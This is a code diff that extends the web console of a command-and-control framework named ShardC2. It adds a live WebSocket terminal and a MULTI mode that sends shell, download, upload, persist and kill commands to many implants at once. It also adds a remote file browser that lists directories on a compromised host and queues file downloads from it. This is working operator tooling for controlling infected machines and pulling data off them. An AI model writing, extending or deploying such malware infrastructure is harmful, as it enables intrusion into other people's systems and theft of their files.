@@ -39,6 +39,11 @@ class App {
     this.terminalLines = [];
     this.activeCampaignId = null;
     this.campaignTab = 'overview';
+    this.ws = null;
+    this.wsConnected = false;
+    this.multiMode = false;
+    this.fileBrowserPath = '/';
+    this.fileBrowserBotId = null;
 
     document.getElementById('token-input').addEventListener('keydown', (e) => {
       if (e.key === 'Enter') this.login();
@@ -83,6 +88,7 @@ class App {
   logout() {
     sessionStorage.removeItem('shardc2_token');
     this.api = null;
+    this.disconnectWS();
     clearInterval(this.refreshTimer);
     document.getElementById('app').classList.add('hidden');
     document.getElementById('login-screen').style.display = 'flex';
@@ -93,7 +99,72 @@ class App {
   showApp() {
     document.getElementById('login-screen').style.display = 'none';
     document.getElementById('app').classList.remove('hidden');
+    this.connectWS();
     this.navigate('dashboard');
+  }
+
+  connectWS() {
+    const token = sessionStorage.getItem('shardc2_token');
+    if (!token) return;
+    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const url = `${proto}//${location.host}/api/v1/ws/terminal?token=${encodeURIComponent(token)}`;
+    try {
+      this.ws = new WebSocket(url);
+      this.ws.onopen = () => {
+        this.wsConnected = true;
+        this.updateConnStatus(true);
+        if (this.selectedBotId) {
+          this.ws.send(JSON.stringify({ action: 'subscribe', bot_id: this.selectedBotId }));
+        }
+      };
+      this.ws.onmessage = (e) => this.handleWSMessage(e);
+      this.ws.onclose = () => {
+        this.wsConnected = false;
+        this.updateConnStatus(false);
+        setTimeout(() => { if (this.api) this.connectWS(); }, 5000);
+      };
+      this.ws.onerror = () => {};
+    } catch (e) {}
+  }
+
+  disconnectWS() {
+    if (this.ws) {
+      this.ws.onclose = null;
+      this.ws.close();
+      this.ws = null;
+    }
+    this.wsConnected = false;
+  }
+
+  updateConnStatus(connected) {
+    const el = document.getElementById('conn-status');
+    if (!el) return;
+    if (connected) {
+      el.innerHTML = '<span class="pulse-dot"></span><span>WS LIVE</span>';
+    } else {
+      el.innerHTML = '<span class="pulse-dot" style="background:var(--yellow);box-shadow:0 0 8px var(--yellow)"></span><span>POLLING</span>';
+    }
+  }
+
+  handleWSMessage(e) {
+    try {
+      const msg = JSON.parse(e.data);
+      if (msg.type === 'result' && this.currentPage === 'terminal') {
+        this.loadHistory();
+      }
+    } catch (err) {}
+  }
+
+  wsSubscribe(botID) {
+    if (this.ws && this.wsConnected) {
+      this.ws.send(JSON.stringify({ action: 'subscribe', bot_id: botID }));
+    }
+  }
+
+  wsUnsubscribe(botID) {
+    if (this.ws && this.wsConnected) {
+      this.ws.send(JSON.stringify({ action: 'unsubscribe', bot_id: botID }));
+    }
   }
 
   navigate(page) {
@@ -109,6 +180,7 @@ class App {
       terminal: () => this.renderTerminal(),
       credentials: () => this.renderCredentials(),
       campaigns: () => this.renderCampaigns(),
+      files: () => this.renderFileBrowser(),
     };
 
     if (renders[page]) renders[page]();
@@ -269,19 +341,32 @@ class App {
       `<option value="${b.id}" ${b.id === this.selectedBotId ? 'selected' : ''}>${esc(b.hostname)} [${b.id.substring(0, 8)}] ${esc(b.ip_address)}</option>`
     ).join('');
 
+    const multiChips = this.bots.map(b =>
+      `<div class="bot-chip ${this.multiMode ? 'multi-target' : ''}" data-botid="${b.id}" onclick="this.classList.toggle('selected')">${esc(b.hostname)} [${b.id.substring(0, 8)}]</div>`
+    ).join('');
+
     c.innerHTML = `
       <div class="terminal-container">
         <div class="terminal-header">
-          <select id="term-bot-select" onchange="app.selectedBotId = this.value; app.loadHistory()">
-            <option value="">-- SELECT TARGET --</option>
-            ${opts}
-          </select>
+          <div id="term-single-select" class="${this.multiMode ? 'hidden' : ''}">
+            <select id="term-bot-select" onchange="app.selectTermBot(this.value)">
+              <option value="">-- SELECT TARGET --</option>
+              ${opts}
+            </select>
+          </div>
+          <button class="btn-sm ${this.multiMode ? 'btn-multi-active' : ''}" onclick="app.toggleMultiMode()" id="multi-btn">MULTI</button>
           <button class="btn-sm" onclick="app.loadHistory()">RELOAD</button>
           <button class="btn-sm" onclick="app.clearTerminal()">CLEAR</button>
+          <span class="ws-badge" id="ws-badge">${this.wsConnected ? 'WS' : 'POLL'}</span>
+        </div>
+        <div id="term-multi-picker" class="${this.multiMode ? '' : 'hidden'}">
+          <div class="bot-picker">${multiChips}</div>
+          <button class="btn-sm" style="margin-top:0.3rem" onclick="document.querySelectorAll('#term-multi-picker .bot-chip').forEach(c=>c.classList.add('selected'))">ALL</button>
         </div>
         <div class="terminal-output" id="term-output"><span class="cmd-system">[*] ShardC2 Remote Shell
 [*] Select a target implant to begin.
-[*] Command types: shell | download | upload | sleep | persist | kill</span></div>
+[*] Command types: shell | download | upload | sleep | persist | kill
+[*] MULTI mode: send commands to multiple implants at once</span></div>
         <div class="terminal-input-row">
           <span class="terminal-prompt">root@shard:~#</span>
           <input type="text" id="term-input" placeholder="enter command..." onkeydown="app.handleTerminalKey(event)" autocomplete="off" spellcheck="false">
@@ -297,7 +382,21 @@ class App {
       </div>`;
 
     document.getElementById('term-input').focus();
-    if (this.selectedBotId) this.loadHistory();
+    if (this.selectedBotId && !this.multiMode) this.loadHistory();
+  }
+
+  selectTermBot(botId) {
+    if (this.selectedBotId) this.wsUnsubscribe(this.selectedBotId);
+    this.selectedBotId = botId;
+    if (botId) {
+      this.wsSubscribe(botId);
+      this.loadHistory();
+    }
+  }
+
+  toggleMultiMode() {
+    this.multiMode = !this.multiMode;
+    this.renderTerminal();
   }
 
   async loadHistory() {
@@ -338,19 +437,67 @@ class App {
     if (e.key === 'Enter') {
       const input = document.getElementById('term-input');
       const cmd = input.value.trim();
-      if (!cmd || !this.selectedBotId) return;
+      if (!cmd) return;
 
       const cmdType = document.getElementById('term-cmd-type').value;
       const output = document.getElementById('term-output');
 
       this.cmdHistory.push(cmd);
       this.historyIndex = this.cmdHistory.length;
+      input.value = '';
+
+      if (this.multiMode) {
+        const selectedBots = [...document.querySelectorAll('#term-multi-picker .bot-chip.selected')]
+          .map(el => el.dataset.botid).filter(Boolean);
+        if (selectedBots.length === 0) {
+          this.terminalLines.push(`\n<span class="cmd-error">[!] No targets selected in MULTI mode</span>`);
+          output.innerHTML = this.terminalLines.join('\n');
+          output.scrollTop = output.scrollHeight;
+          return;
+        }
+
+        const names = selectedBots.map(id => {
+          const b = this.bots.find(b => b.id === id);
+          return b ? b.hostname : id.substring(0, 8);
+        }).join(', ');
+        this.terminalLines.push(`\n<span class="cmd-system">[MULTI:${cmdType.toUpperCase()}] &raquo; ${esc(names)}</span> <span class="cmd-input">${esc(cmd)}</span>`);
+        this.terminalLines.push(`<span class="cmd-system">[DISPATCHING TO ${selectedBots.length} TARGETS...]</span>`);
+        output.innerHTML = this.terminalLines.join('\n');
+        output.scrollTop = output.scrollHeight;
+
+        try {
+          const result = await this.api.post('/commands/batch', {
+            bot_ids: selectedBots,
+            type: cmdType,
+            payload: cmd,
+          });
+          this.terminalLines.pop();
+          const cmds = result.commands || [];
+          this.terminalLines.push(`<span class="cmd-system">[DISPATCHED ${cmds.length} COMMANDS — awaiting results...]</span>`);
+          output.innerHTML = this.terminalLines.join('\n');
+          output.scrollTop = output.scrollHeight;
+
+          selectedBots.forEach(id => this.wsSubscribe(id));
+
+          if (!this.wsConnected) {
+            this.pollCount = 0;
+            this.pollMultiBots = selectedBots;
+            setTimeout(() => this.pollMultiResults(), 2000);
+          }
+        } catch (err) {
+          this.terminalLines.pop();
+          this.terminalLines.push(`<span class="cmd-error">[!] Batch send failed: ${err.message}</span>`);
+          output.innerHTML = this.terminalLines.join('\n');
+        }
+        return;
+      }
+
+      if (!this.selectedBotId) return;
 
       this.terminalLines.push(`\n<span class="cmd-system">[${cmdType.toUpperCase()}]</span> <span class="cmd-input">${esc(cmd)}</span>`);
       this.terminalLines.push(`<span class="cmd-system">[PENDING...]</span>`);
       output.innerHTML = this.terminalLines.join('\n');
       output.scrollTop = output.scrollHeight;
-      input.value = '';
 
       try {
         await this.api.post('/commands/', {
@@ -358,11 +505,13 @@ class App {
           type: cmdType,
           payload: cmd,
         });
-        this.pollCount = 0;
-        setTimeout(() => this.pollForResult(), 1000);
-      } catch (e) {
+        if (!this.wsConnected) {
+          this.pollCount = 0;
+          setTimeout(() => this.pollForResult(), 1000);
+        }
+      } catch (err) {
         this.terminalLines.pop();
-        this.terminalLines.push(`<span class="cmd-error">[!] Send failed: ${e.message}</span>`);
+        this.terminalLines.push(`<span class="cmd-error">[!] Send failed: ${err.message}</span>`);
         output.innerHTML = this.terminalLines.join('\n');
       }
     } else if (e.key === 'ArrowUp') {
@@ -381,6 +530,60 @@ class App {
         document.getElementById('term-input').value = '';
       }
     }
+  }
+
+  async pollMultiResults() {
+    if (this.currentPage !== 'terminal' || !this.pollMultiBots) return;
+    const output = document.getElementById('term-output');
+    let allDone = true;
+
+    for (const botId of this.pollMultiBots) {
+      try {
+        const data = await this.api.get(`/commands/history/${botId}`);
+        const cmds = (data.commands || []);
+        const latest = cmds[0];
+        if (latest && (latest.status === 'pending' || latest.status === 'executing')) {
+          allDone = false;
+        }
+      } catch (e) {}
+    }
+
+    this.loadMultiHistory();
+
+    this.pollCount = (this.pollCount || 0) + 1;
+    if (!allDone && this.pollCount < 30) {
+      setTimeout(() => this.pollMultiResults(), 2000);
+    }
+  }
+
+  async loadMultiHistory() {
+    if (!this.pollMultiBots || this.pollMultiBots.length === 0) return;
+    const output = document.getElementById('term-output');
+    this.terminalLines = [];
+
+    for (const botId of this.pollMultiBots) {
+      const bot = this.bots.find(b => b.id === botId);
+      const label = bot ? `${bot.hostname} [${botId.substring(0, 8)}]` : botId.substring(0, 8);
+      try {
+        const data = await this.api.get(`/commands/history/${botId}`);
+        const cmds = (data.commands || []).reverse();
+        const latest = cmds[cmds.length - 1];
+        if (latest) {
+          this.terminalLines.push(`\n<span class="cmd-system">[${esc(label)}]</span> <span class="cmd-input">${esc(latest.payload)}</span>`);
+          if (latest.output) {
+            const cls = latest.status === 'failed' ? 'cmd-error' : 'cmd-output';
+            this.terminalLines.push(`<span class="${cls}">${esc(latest.output)}</span>`);
+          } else {
+            this.terminalLines.push(`<span class="cmd-system">[${latest.status.toUpperCase()}...]</span>`);
+          }
+        }
+      } catch (e) {
+        this.terminalLines.push(`\n<span class="cmd-error">[${esc(label)}] fetch failed</span>`);
+      }
+    }
+
+    output.innerHTML = this.terminalLines.join('\n') || '<span class="cmd-system">[*] Awaiting results...</span>';
+    output.scrollTop = output.scrollHeight;
   }
 
   async pollForResult() {
@@ -934,6 +1137,154 @@ class App {
       this.refreshCampaigns();
     }
   }
+  // ===== FILE BROWSER =====
+  async renderFileBrowser() {
+    const c = document.getElementById('content');
+
+    if (this.bots.length === 0) {
+      const data = await this.api.get('/bots/');
+      this.bots = data.bots || [];
+    }
+
+    const opts = this.bots.map(b =>
+      `<option value="${b.id}" ${b.id === this.fileBrowserBotId ? 'selected' : ''}>${esc(b.hostname)} [${b.id.substring(0, 8)}]</option>`
+    ).join('');
+
+    c.innerHTML = `
+      <div class="page-header">
+        <h1 class="page-title">FILE BROWSER</h1>
+        <span class="page-tag">REMOTE FS</span>
+      </div>
+      <div class="terminal-header" style="margin-bottom:1rem">
+        <select id="fb-bot-select" onchange="app.fileBrowserBotId=this.value;app.fileBrowserPath='/';app.browseDir('/')">
+          <option value="">-- SELECT TARGET --</option>
+          ${opts}
+        </select>
+        <div class="fb-breadcrumbs" id="fb-breadcrumbs"></div>
+      </div>
+      <div id="fb-content">
+        <div class="empty-state"><p>SELECT A TARGET TO BROWSE FILES</p></div>
+      </div>`;
+
+    if (this.fileBrowserBotId) this.browseDir(this.fileBrowserPath);
+  }
+
+  async browseDir(path) {
+    if (!this.fileBrowserBotId) return;
+    this.fileBrowserPath = path;
+
+    this.updateBreadcrumbs(path);
+    const el = document.getElementById('fb-content');
+    el.innerHTML = '<div class="empty-state"><p>LOADING...</p></div>';
+
+    try {
+      const result = await this.api.post('/commands/', {
+        bot_id: this.fileBrowserBotId,
+        type: 'shell',
+        payload: `ls -la --time-style=long-iso ${path.replace(/'/g, "\\'")} 2>&1`,
+      });
+
+      const cmdId = result.id;
+      let attempts = 0;
+      const poll = async () => {
+        attempts++;
+        const data = await this.api.get(`/commands/history/${this.fileBrowserBotId}`);
+        const cmds = data.commands || [];
+        const cmd = cmds.find(c => c.id === cmdId);
+        if (!cmd || cmd.status === 'pending' || cmd.status === 'executing') {
+          if (attempts < 20) setTimeout(poll, 1000);
+          else el.innerHTML = '<div class="empty-state"><p>COMMAND TIMED OUT</p></div>';
+          return;
+        }
+        if (cmd.status === 'failed') {
+          el.innerHTML = `<div class="empty-state"><p>ERROR: ${esc(cmd.output)}</p></div>`;
+          return;
+        }
+        this.renderFileList(cmd.output, path);
+      };
+      setTimeout(poll, 1500);
+    } catch (e) {
+      el.innerHTML = `<div class="empty-state"><p>FAILED: ${esc(e.message)}</p></div>`;
+    }
+  }
+
+  updateBreadcrumbs(path) {
+    const el = document.getElementById('fb-breadcrumbs');
+    if (!el) return;
+    const parts = path.split('/').filter(Boolean);
+    let crumbs = `<span class="fb-crumb" onclick="app.browseDir('/')">/</span>`;
+    let acc = '/';
+    for (const part of parts) {
+      acc += part + '/';
+      const p = acc;
+      crumbs += `<span class="fb-sep">/</span><span class="fb-crumb" onclick="app.browseDir('${esc(p)}')">${esc(part)}</span>`;
+    }
+    el.innerHTML = crumbs;
+  }
+
+  renderFileList(output, currentPath) {
+    const el = document.getElementById('fb-content');
+    const lines = output.split('\n').filter(l => l.trim() && !l.startsWith('total '));
+    const files = [];
+
+    for (const line of lines) {
+      const match = line.match(/^([drwxlsStT\-]{10})\s+(\d+)\s+(\S+)\s+(\S+)\s+(\d+)\s+(\d{4}-\d{2}-\d{2})\s+(\d{2}:\d{2})\s+(.+)$/);
+      if (!match) continue;
+      const [, perms, , owner, group, size, date, time_, name] = match;
+      if (name === '.' || name === '..') continue;
+      const isDir = perms.startsWith('d');
+      const isLink = perms.startsWith('l');
+      const displayName = isLink ? name.split(' -> ')[0] : name;
+      files.push({ perms, owner, group, size: parseInt(size), date, time: time_, name: displayName, isDir, isLink, raw: name });
+    }
+
+    if (files.length === 0) {
+      el.innerHTML = '<div class="empty-state"><p>EMPTY DIRECTORY</p></div>';
+      return;
+    }
+
+    files.sort((a, b) => {
+      if (a.isDir && !b.isDir) return -1;
+      if (!a.isDir && b.isDir) return 1;
+      return a.name.localeCompare(b.name);
+    });
+
+    const parentPath = currentPath === '/' ? null : currentPath.replace(/\/[^\/]+\/?$/, '/') || '/';
+
+    el.innerHTML = `<div class="table-wrap"><table>
+      <thead><tr><th>Name</th><th>Permissions</th><th>Owner</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead>
+      <tbody>
+        ${parentPath !== null ? `<tr class="clickable" onclick="app.browseDir('${esc(parentPath)}')"><td colspan="6" style="color:var(--yellow)">..</td></tr>` : ''}
+        ${files.map(f => {
+          const fullPath = currentPath.replace(/\/$/, '') + '/' + f.name;
+          const nameStyle = f.isDir ? 'color:var(--yellow);font-weight:600' : f.isLink ? 'color:var(--green)' : 'color:var(--text-bright)';
+          const icon = f.isDir ? '&#128193; ' : f.isLink ? '&#128279; ' : '';
+          const clickAction = f.isDir ? `onclick="app.browseDir('${esc(fullPath)}/')"` : '';
+          return `<tr class="${f.isDir ? 'clickable' : ''}" ${clickAction}>
+            <td style="${nameStyle}">${icon}${esc(f.name)}${f.isLink ? ` <span style="color:var(--text-muted)">&rarr; ${esc(f.raw.split(' -> ')[1] || '')}</span>` : ''}</td>
+            <td style="color:var(--text-muted);font-size:0.72rem">${esc(f.perms)}</td>
+            <td style="font-size:0.72rem">${esc(f.owner)}</td>
+            <td style="font-size:0.72rem">${formatSize(f.size)}</td>
+            <td style="font-size:0.72rem;color:var(--text-muted)">${f.date} ${f.time}</td>
+            <td>${!f.isDir ? `<button class="btn-sm" onclick="event.stopPropagation();app.downloadFile('${esc(fullPath)}')">GET</button>` : ''}</td>
+          </tr>`;
+        }).join('')}
+      </tbody></table></div>`;
+  }
+
+  async downloadFile(path) {
+    if (!this.fileBrowserBotId) return;
+    try {
+      await this.api.post('/commands/', {
+        bot_id: this.fileBrowserBotId,
+        type: 'download',
+        payload: path,
+      });
+      alert(`Download command queued for: ${path}\nCheck terminal for base64 output.`);
+    } catch (e) {
+      alert(`Failed: ${e.message}`);
+    }
+  }
 }
 
 // ===== HELPERS =====
@@ -971,6 +1322,14 @@ function campStatusBadge(status) {
     'pending': 'badge-pending',
   };
   return `<span class="badge ${map[status] || 'badge-dead'}">${esc(status).toUpperCase()}</span>`;
+}
+
+function formatSize(bytes) {
+  if (bytes === 0) return '0';
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' K';
+  if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' M';
+  return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' G';
 }
 
 function osTag(os) {
